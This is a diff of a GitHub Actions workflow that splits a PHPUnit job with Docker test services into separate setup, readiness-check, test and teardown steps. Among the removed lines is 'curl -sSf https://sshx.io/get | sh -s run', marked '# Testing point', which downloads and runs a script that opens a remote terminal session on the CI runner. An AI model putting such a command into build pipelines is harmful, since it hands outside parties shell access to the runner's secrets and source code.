@@ -281,7 +281,6 @@ jobs:
       image: php:8.3
       volumes:
         - /var/run/docker.sock:/var/run/docker.sock
-        - ./tests/docker:/tests/docker
     if: needs.check-phpunit.outputs.phpunit-exists == 'true'
 
     steps:
@@ -336,57 +335,94 @@ jobs:
         run: |
           docker-compose -f docker-compose.test.yml build
 
-      - name: Run PHPUnit tests
+      - name: Prepare for volume mounting
+        run: |
+          # Define workspace path as current directory
+          WORKSPACE_PATH=$(pwd)
+          echo "Using workspace path: $WORKSPACE_PATH"
+          
+          # Ensure directories exist and have appropriate permissions
+          mkdir -p tests/docker/coffee/logs tests/docker/teapot/logs
+          chmod -R 777 tests/docker
+          
+          # Create a new docker-compose file with absolute paths
+          cat docker-compose.test.yml | sed "s|- \./tests/docker/|- $WORKSPACE_PATH/tests/docker/|g" > docker-compose.test.absolute.yml
+          
+          # Debug output to verify the changes
+          echo "Original volume path entries:"
+          grep -A 2 "volumes:" docker-compose.test.yml | head -10
+          
+          echo "Updated volume path entries with absolute paths:"
+          grep -A 2 "volumes:" docker-compose.test.absolute.yml | head -10
+          
+          # Use the updated docker-compose file
+          cp docker-compose.test.absolute.yml docker-compose.test.yml
+          
+          # Debug: Show docker info and current directory structure
+          docker info
+          ls -la
+          ls -la tests/docker/
+
+      - name: Start Docker services with host networking
+        run: |
+          # Start services with host networking
+          docker-compose -f docker-compose.test.yml up -d
+        env:
+          COMPOSE_DOCKER_CLI_BUILD: 1
+          DOCKER_BUILDKIT: 1
+          DOCKER_HOST: "unix:///var/run/docker.sock"
+
+      - name: Verify container logs and mounts
+        run: |
+          # List running containers
+          docker ps
+          
+          # Check if services are running properly
+          docker-compose -f docker-compose.test.yml logs
+          
+          # Verify the volumes are mounted correctly
+          for container in $(docker-compose -f docker-compose.test.yml ps -q); do
+            echo "Inspecting container $container:"
+            docker inspect -f '{{ .Mounts }}' $container
+          done
+
+      - name: Wait for services to be ready
         run: |
           check_service() {
               local port=$1
               local max_attempts=30
               local wait_seconds=2
               local attempt=1
-              
+          
               while [ $attempt -le $max_attempts ]; do
               echo "Checking service on port $port (attempt $attempt/$max_attempts)..."
               if curl -s -o /dev/null -w "%{http_code}" -H "Request-Type: ping" http://172.17.0.1:$port | grep -q "200"; then
                 echo "Service on port $port is available!"
                 return 0
               fi
-              
+          
               echo "Service on port $port not yet available. Waiting ${wait_seconds}s before next attempt..."
               sleep $wait_seconds
               attempt=$((attempt + 1))
               done
-              
+          
               echo "Error: Service on port $port not available after $max_attempts attempts"
               return 1
           }
-
-          # Prepare the environment
-          chmod -R 777 tests/docker
           
-          # Create a new docker-compose file with absolute paths
-          cat docker-compose.test.yml | sed "s|- \./tests/docker/|- $WORKSPACE_PATH/tests/docker/|g" > docker-compose.test.updated.yml
-          
-          # Verify the changes
-          echo "Original volume path entries:"
-          grep -A 2 "volumes:" docker-compose.test.yml | head -10
-          
-          echo "Updated volume path entries:"
-          grep -A 2 "volumes:" docker-compose.test.updated.yml | head -10
-          
-          # Use the updated docker-compose file for subsequent steps
-          cp docker-compose.test.updated.yml docker-compose.test.yml
-          
-          # Prepare phpunit
-          wget https://phar.phpunit.de/phpunit-11.3.phar
-          docker-compose -f docker-compose.test.yml up -d
           check_service 8087 || exit 1
           check_service 8086 || exit 1
+
+      - name: Run PHPUnit tests
+        run: |
+          # Prepare phpunit
+          wget https://phar.phpunit.de/phpunit-11.3.phar
           
-          # Testing point
-          curl -sSf https://sshx.io/get | sh -s run
-          
-          # Run the tests and tare down the test environment
+          # Run the tests
           php phpunit-11.3.phar --configuration phpunit.xml --log-junit reports/junit.xml --log-teamcity reports/teamcity --testdox-html reports/testdox.html --testdox-text reports/testdox.txt
+
+      - name: Teardown test environment
+        run: |
           docker-compose -f docker-compose.test.yml down
 
       - name: Upload test reports
